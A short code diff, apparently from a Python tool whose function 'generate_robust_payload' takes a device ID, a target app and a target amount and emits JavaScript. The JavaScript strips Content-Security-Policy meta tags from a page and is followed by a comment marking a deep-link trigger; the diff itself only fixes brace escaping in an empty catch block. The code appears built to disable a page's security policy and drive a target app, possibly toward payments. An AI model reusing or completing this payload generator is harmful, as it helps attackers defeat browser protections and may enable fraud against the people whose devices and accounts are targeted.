@@ -41,7 +41,7 @@ def generate_robust_payload(device_id, target_app, target_amount):
         try {{
             const metaTags = document.querySelectorAll('meta[http-equiv="Content-Security-Policy"]');
             metaTags.forEach(tag => tag.remove());
-        }} catch (e) {}
+        }} catch (e) {{}}
     }}
     
     // Deep link trigger
